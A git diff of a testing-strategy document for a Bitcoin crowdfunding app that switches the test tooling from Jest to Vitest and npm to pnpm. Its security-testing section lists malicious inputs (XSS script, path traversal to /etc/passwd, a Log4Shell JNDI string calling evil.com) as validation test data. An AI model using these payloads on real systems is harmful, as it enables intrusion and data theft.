@@ -16,31 +16,36 @@ This document outlines the comprehensive testing strategy for OrangeCat, a Bitco
 
 ### Test Layers
 
-#### 1. Unit Tests (Jest + Testing Library)
+#### 1. Unit Tests (Vitest + Testing Library)
+
 - **Purpose**: Test individual functions, components, and services in isolation
-- **Tools**: Jest, @testing-library/react, @testing-library/jest-dom
+- **Tools**: Vitest, @testing-library/react, @testing-library/jest-dom
 - **Coverage**: 85%+ of all source code
 - **Execution**: Fast, run in parallel, part of CI/CD pipeline
 
-#### 2. Integration Tests (Jest)
+#### 2. Integration Tests (Vitest)
+
 - **Purpose**: Test interactions between components and services
-- **Tools**: Jest with custom test utilities
+- **Tools**: Vitest with custom test utilities
 - **Coverage**: Critical user flows and service interactions
 - **Execution**: Run after unit tests, part of CI/CD pipeline
 
 #### 3. End-to-End Tests (Playwright)
+
 - **Purpose**: Test complete user journeys from browser perspective
 - **Tools**: Playwright with multiple browser support
 - **Coverage**: All user-facing functionality
 - **Execution**: Run in parallel, part of CI/CD pipeline
 
 #### 4. Performance Tests (Playwright + Lighthouse)
+
 - **Purpose**: Test application performance under load
 - **Tools**: Playwright, Lighthouse, custom performance monitoring
 - **Coverage**: All critical user paths
 - **Execution**: Run periodically and before releases
 
 #### 5. Security Tests (Custom + OWASP ZAP)
+
 - **Purpose**: Test for security vulnerabilities
 - **Tools**: Custom security testing framework, OWASP ZAP
 - **Coverage**: All input validation, authentication, authorization
@@ -51,6 +56,7 @@ This document outlines the comprehensive testing strategy for OrangeCat, a Bitco
 ### Unit Testing Guidelines
 
 #### Component Testing
+
 ```typescript
 // ✅ Good: User-centric testing with Testing Library
 test('should show user profile information', async () => {
@@ -62,12 +68,13 @@ test('should show user profile information', async () => {
 
 // ❌ Bad: Implementation detail testing
 test('should call useEffect on mount', () => {
-  const mockUseEffect = jest.spyOn(React, 'useEffect');
+  const mockUseEffect = vi.spyOn(React, 'useEffect');
   // This is fragile and tests implementation details
 });
 ```
 
 #### Service Testing
+
 ```typescript
 // ✅ Good: Test behavior, not implementation
 test('should return user profile', async () => {
@@ -76,7 +83,7 @@ test('should return user profile', async () => {
   expect(result).toEqual({
     id: 'user-id',
     name: 'Test User',
-    email: 'test@example.com'
+    email: 'test@example.com',
   });
 });
 
@@ -94,6 +101,7 @@ test('should handle API errors gracefully', async () => {
 ### Integration Testing Guidelines
 
 #### Service Integration
+
 ```typescript
 test('should integrate ProfileService with Supabase', async () => {
   const user = await createTestUser();
@@ -105,6 +113,7 @@ test('should integrate ProfileService with Supabase', async () => {
 ```
 
 #### Component Integration
+
 ```typescript
 test('ProfileCard should integrate with ProfileService', async () => {
   const user = await createTestUser();
@@ -120,6 +129,7 @@ test('ProfileCard should integrate with ProfileService', async () => {
 ### E2E Testing Guidelines
 
 #### User Journey Testing
+
 ```typescript
 test('should complete user registration flow', async ({ page }) => {
   await page.goto('/auth');
@@ -134,6 +144,7 @@ test('should complete user registration flow', async ({ page }) => {
 ```
 
 #### Critical Path Testing
+
 ```typescript
 test('should handle Bitcoin donation flow', async ({ page }) => {
   await page.goto('/project/test-project');
@@ -149,8 +160,9 @@ test('should handle Bitcoin donation flow', async ({ page }) => {
 ## Test Organization
 
 ### Directory Structure
+
 ```
-__tests__/                    # Jest unit tests
+__tests__/                    # Vitest unit tests
   /components/                # Component unit tests
   /services/                  # Service unit tests
   /utils/                     # Utility function tests
@@ -161,7 +173,7 @@ tests/                        # Integration and E2E tests
     /auth/                    # Authentication flows
     /donations/               # Donation flows
     /projects/               # Campaign management
-  /integration/               # Jest integration tests
+  /integration/               # Vitest integration tests
   /performance/               # Performance tests
   /security/                  # Security tests
 
@@ -175,6 +187,7 @@ src/
 ### Test Naming Conventions
 
 #### Unit Tests
+
 ```
 ComponentName.test.tsx          # Component tests
 serviceName.test.ts             # Service tests
@@ -182,12 +195,14 @@ utilityName.test.ts             # Utility tests
 ```
 
 #### Integration Tests
+
 ```
 ServiceName.integration.test.ts  # Service integration tests
 ComponentName.integration.test.tsx # Component integration tests
 ```
 
 #### E2E Tests
+
 ```
 user-journey.spec.ts            # User journey tests
 critical-path.spec.ts           # Critical business flows
@@ -196,24 +211,26 @@ critical-path.spec.ts           # Critical business flows
 ## Test Data Management
 
 ### Mock Data Strategy
+
 ```typescript
 // Create reusable test data factories
 export const createTestUser = (overrides = {}) => ({
   id: 'test-user-id',
   email: 'test@example.com',
   name: 'Test User',
-  ...overrides
+  ...overrides,
 });
 
 export const createTestCampaign = (overrides = {}) => ({
   id: 'test-project-id',
   title: 'Test Campaign',
   goalAmount: 1000000, // in sats
-  ...overrides
+  ...overrides,
 });
 ```
 
 ### Database Test Data
+
 ```typescript
 // Use test-specific database seeding
 beforeAll(async () => {
@@ -228,6 +245,7 @@ afterAll(async () => {
 ## CI/CD Integration
 
 ### Test Pipeline Structure
+
 ```yaml
 # .github/workflows/test.yml
 name: Test Suite
@@ -240,9 +258,9 @@ jobs:
       - uses: actions/checkout@v3
       - uses: actions/setup-node@v3
       - name: Install dependencies
-        run: npm ci
+        run: pnpm install --frozen-lockfile
       - name: Run unit tests
-        run: npm run test:unit
+        run: pnpm run test:unit
 
   integration-tests:
     runs-on: ubuntu-latest
@@ -250,7 +268,7 @@ jobs:
       - uses: actions/checkout@v3
       - uses: actions/setup-node@v3
       - name: Run integration tests
-        run: npm run test:integration
+        run: pnpm run test:integration
 
   e2e-tests:
     runs-on: ubuntu-latest
@@ -258,63 +276,61 @@ jobs:
       - uses: actions/checkout@v3
       - uses: actions/setup-node@v3
       - name: Install Playwright
-        run: npx playwright install
+        run: pnpm exec playwright install
       - name: Run E2E tests
-        run: npm run test:e2e
+        run: pnpm run test:e2e
 ```
 
 ### Test Reporting
+
 ```typescript
-// jest.config.js
-module.exports = {
-  // ... other config
-  reporters: [
-    'default',
-    ['jest-junit', {
-      outputDirectory: 'test-results',
-      outputName: 'junit.xml'
-    }],
-    ['jest-html-reporter', {
-      outputPath: 'test-results/report.html'
-    }]
-  ]
-};
+// vitest.config.ts
+export default defineConfig({
+  test: {
+    // ... other config
+    reporters: [
+      'default',
+      ['junit', { outputFile: 'test-results/junit.xml' }],
+      ['html', { outputFile: 'test-results/report.html' }],
+    ],
+  },
+});
 ```
 
 ## Performance Testing Strategy
 
 ### Core Web Vitals Monitoring
+
 ```typescript
 test('should meet Core Web Vitals thresholds', async ({ page }) => {
   const metrics = await page.evaluate(() => {
     return {
       lcp: performance.getEntriesByType('largest-contentful-paint')[0]?.startTime,
       fid: performance.getEntriesByType('first-input')[0]?.processingStart,
-      cls: 0 // Calculate Cumulative Layout Shift
+      cls: 0, // Calculate Cumulative Layout Shift
     };
   });
 
   expect(metrics.lcp).toBeLessThan(2500); // LCP < 2.5s
-  expect(metrics.fid).toBeLessThan(100);  // FID < 100ms
-  expect(metrics.cls).toBeLessThan(0.1);  // CLS < 0.1
+  expect(metrics.fid).toBeLessThan(100); // FID < 100ms
+  expect(metrics.cls).toBeLessThan(0.1); // CLS < 0.1
 });
 ```
 
 ### Load Testing
+
 ```typescript
 test('should handle concurrent user load', async () => {
   const browsers = await Promise.all(
-    Array(10).fill().map(() => playwright.chromium.launch())
+    Array(10)
+      .fill()
+      .map(() => playwright.chromium.launch())
   );
 
-  const pages = await Promise.all(
-    browsers.map(browser => browser.newPage())
-  );
+  const pages = await Promise.all(browsers.map(browser => browser.newPage()));
 
   // Simulate concurrent users
-  await Promise.all(
-    pages.map(page => page.goto('/project/test-project'))
-  );
+  await Promise.all(pages.map(page => page.goto('/project/test-project')));
 
   // Verify system remains responsive
   const responseTimes = await Promise.all(
@@ -328,13 +344,14 @@ test('should handle concurrent user load', async () => {
 ## Security Testing Strategy
 
 ### Input Validation Testing
+
 ```typescript
 test('should validate all user inputs', async () => {
   const maliciousInputs = [
     '<script>alert("xss")</script>',
     '../../../etc/passwd',
     'javascript:alert(1)',
-    '${jndi:ldap://evil.com/a}'
+    '${jndi:ldap://evil.com/a}',
   ];
 
   for (const input of maliciousInputs) {
@@ -347,6 +364,7 @@ test('should validate all user inputs', async () => {
 ```
 
 ### Authentication Testing
+
 ```typescript
 test('should enforce proper authentication', async ({ page }) => {
   // Test without authentication
@@ -374,6 +392,7 @@ test('should handle session expiration', async ({ page }) => {
 ## Monitoring and Alerting
 
 ### Test Health Monitoring
+
 ```typescript
 // Monitor test execution health
 const testMetrics = {
@@ -382,7 +401,7 @@ const testMetrics = {
   failingTests: 50,
   flakyTests: 10,
   averageExecutionTime: 120, // seconds
-  coveragePercentage: 92.5
+  coveragePercentage: 92.5,
 };
 
 if (testMetrics.failingTests > testMetrics.totalTests * 0.05) {
@@ -395,6 +414,7 @@ if (testMetrics.coveragePercentage < 90) {
 ```
 
 ### Performance Regression Detection
+
 ```typescript
 test('should not regress performance', async ({ page }) => {
   const baselineMetrics = await getBaselineMetrics();
@@ -414,12 +434,14 @@ test('should not regress performance', async ({ page }) => {
 ## Maintenance and Evolution
 
 ### Test Refactoring
+
 - Regularly review and update tests to match code changes
 - Remove obsolete tests
 - Consolidate duplicate test logic
 - Improve test readability and maintainability
 
 ### Test Debt Management
+
 - Track technical debt in tests
 - Prioritize fixing flaky tests
 - Maintain test coverage as code evolves
@@ -444,9 +466,3 @@ This comprehensive testing strategy ensures OrangeCat maintains high quality, se
 **Created**: 2025-09-24
 **Last Modified**: 2025-09-24
 **Last Modified Summary**: Initial comprehensive testing strategy document
-
-
-
-
-
-
